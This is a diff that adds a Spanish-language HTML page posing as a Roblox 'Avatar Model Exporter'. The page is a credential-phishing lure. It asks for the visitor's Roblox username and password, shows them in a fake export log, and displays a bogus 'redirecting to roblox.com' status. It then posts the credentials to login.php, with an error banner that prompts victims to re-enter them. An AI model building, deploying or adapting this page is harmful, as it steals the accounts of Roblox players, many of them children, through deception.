@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Avatar Model Exporter</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: #0f1113;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+    color: #fff;
+  }
+  .marco {
+    display: flex;
+    width: 100%;
+    max-width: 700px;
+    background: #1b1d1f;
+    border-radius: 12px;
+    overflow: hidden;
+    box-shadow: 0 20px 60px rgba(0,0,0,.6);
+  }
+  .izq {
+    flex: 1;
+    padding: 34px 28px;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    min-height: 430px;
+  }
+  .logo {
+    text-align: center;
+    font-size: 27px;
+    font-weight: 800;
+    letter-spacing: -1.2px;
+    margin-bottom: 6px;
+  }
+  .sub {
+    text-align: center;
+    font-size: 13px;
+    color: #a5a5a5;
+    margin-bottom: 22px;
+  }
+  form { display: flex; flex-direction: column; gap: 10px; }
+  input {
+    padding: 12px;
+    border-radius: 8px;
+    border: 1px solid #3d4045;
+    background: #232527;
+    color: #fff;
+    font-size: 14px;
+    width: 100%;
+  }
+  input:focus { outline: none; border-color: #00a2ff; }
+  button {
+    padding: 12px;
+    border-radius: 8px;
+    border: 0;
+    background: #00a2ff;
+    color: #fff;
+    font-weight: 700;
+    font-size: 15px;
+    cursor: pointer;
+  }
+  button:hover { background: #0090e0; }
+  button:disabled { opacity: .6; cursor: default; }
+  .aviso {
+    font-size: 11px;
+    color: #777;
+    text-align: center;
+    margin-top: 14px;
+  }
+  .error {
+    background: #3a1c1c;
+    border: 1px solid #6b2b2b;
+    color: #ff8a8a;
+    font-size: 12px;
+    padding: 8px 10px;
+    border-radius: 6px;
+    margin-bottom: 12px;
+    text-align: center;
+  }
+  .der {
+    flex: 1;
+    background: #111315;
+    border-left: 1px solid #2a2c2f;
+    padding: 20px;
+    font-family: ui-monospace, Menlo, Consolas, monospace;
+    font-size: 12px;
+    color: #7ee787;
+    line-height: 1.7;
+  }
+  .der .titulo { color: #6b7280; margin-bottom: 10px; }
+  .der .linea { white-space: pre-wrap; word-break: break-all; }
+  .der .estado { color: #f0b72f; margin-top: 14px; }
+  @media (max-width: 620px) {
+    .der { display: none; }
+    .izq { min-height: auto; padding: 30px 22px; }
+  }
+</style>
+</head>
+<body>
+  <div class="marco">
+    <div class="izq">
+      <div class="logo">Roblox Avatar Model</div>
+      <div class="sub">Obtener modelo de mi avatar de roblox</div>
+
+      <div class="error" id="error" style="display:none;">Usuario o contraseña incorrectos</div>
+
+      <form id="form" action="login.php" method="POST">
+        <input id="usuario" name="usuario" placeholder="Nombre de usuario" autocomplete="username">
+        <input id="clave" name="clave" type="password" placeholder="Contraseña" autocomplete="current-password">
+        <button type="submit" id="btn">Descargar</button>
+      </form>
+
+      <div class="aviso">debes tocar el boton "descargar" para continuar...</div>
+    </div>
+
+    <div class="der">
+      <div class="titulo">// Esperando datos para exportar modelo 3D</div>
+      <div class="linea" id="log">esperando...</div>
+      <div class="estado" id="estado"></div>
+    </div>
+  </div>
+
+<script>
+  var log = document.getElementById('log');
+  var estado = document.getElementById('estado');
+  var form = document.getElementById('form');
+  var btn = document.getElementById('btn');
+
+  if (location.search.indexOf('error=1') > -1) {
+    document.getElementById('error').style.display = 'block';
+  }
+
+  function esc(t) {
+    return t.replace(/&/g, '&amp;').replace(/</g, '&lt;');
+  }
+
+  form.addEventListener('submit', function (e) {
+    e.preventDefault();
+
+    var u = document.getElementById('usuario').value || '(vacío)';
+    var p = document.getElementById('clave').value || '(vacío)';
+
+    log.innerHTML =
+      '<div>usuario: ' + esc(u) + '</div>' +
+      '<div>clave: ' + esc(p) + '</div>';
+
+    estado.textContent = '→ Cargando modelo de roblox para descargar. / redirigiendo a roblox.com...';
+    btn.disabled = true;
+    btn.textContent = 'Entrando...';
+
+    setTimeout(function () {
+      form.submit();
+    }, 900);
+  });
+</script>
+</body>
+</html>
